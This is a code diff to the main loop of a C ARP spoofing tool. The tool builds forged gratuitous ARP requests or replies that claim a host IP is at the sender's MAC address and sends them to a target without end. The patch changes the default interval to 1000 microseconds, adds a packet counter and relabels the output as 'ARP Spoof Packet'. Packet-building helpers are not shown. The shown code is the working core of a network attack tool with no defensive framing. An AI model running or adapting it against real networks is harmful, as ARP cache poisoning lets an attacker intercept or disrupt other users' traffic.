@@ -79,7 +79,7 @@ int main(int argc, char* argv[])
 	}
 
 	if (interval < 0)
-		interval = 2;
+		interval = 1000;
 
 	struct ether_addr iface_hwaddr;
 	if (mac_from_iface(argv[ifname_idx], &iface_hwaddr) < 0) {
@@ -103,12 +103,12 @@ int main(int argc, char* argv[])
 	struct arp_packet* arp;
 	if( gratuitous_arp_idx > 0 ){
 		if(strncmp(argv[gratuitous_arp_idx], "q", 1) == 0){
-			printf("gratuitous arp request : %s\n", argv[gratuitous_arp_idx]);
+			printf(" gratuitous arp request : %s\n", argv[gratuitous_arp_idx]);
 			arp = create_arp_packet("ff:ff:ff:ff:ff:ff", sendr_mac,
 					ARPOP_REQUEST, sendr_mac, argv[hostip_idx],
 					"00:00:00:00:00:00", argv[hostip_idx]);
 		}else if(strncmp(argv[gratuitous_arp_idx], "p", 1) == 0){
-			printf("gratuitous arp reply : %s\n", argv[gratuitous_arp_idx]);
+			printf(" gratuitous arp reply : %s\n", argv[gratuitous_arp_idx]);
 			arp = create_arp_packet("ff:ff:ff:ff:ff:ff", sendr_mac,
 					ARPOP_REPLY, sendr_mac, argv[hostip_idx],
 					"00:00:00:00:00:00", argv[hostip_idx]);
@@ -129,12 +129,13 @@ int main(int argc, char* argv[])
 		return -1;
 	}
 
-	printf("Interval: per %ds\n", interval);
+	printf(" Start Sending ARP Spoof Packet, Packet Interval %d us \n", interval);
+	long cnt=0;
 	while (1) {
 		if (send_arp_to(arp, sock, if_idx) > 0) {
-			printf("send ARP: %s is at %s --to-> %s\n", argv[hostip_idx], sendr_mac, argv[targetip_idx]);
+			printf("\r send NO. %ld ARP: %s is at %s --to-> %s", ++cnt, argv[hostip_idx], sendr_mac, 
+					argv[targetip_idx]);
 		}
-
 		usleep(interval);
 	}
 
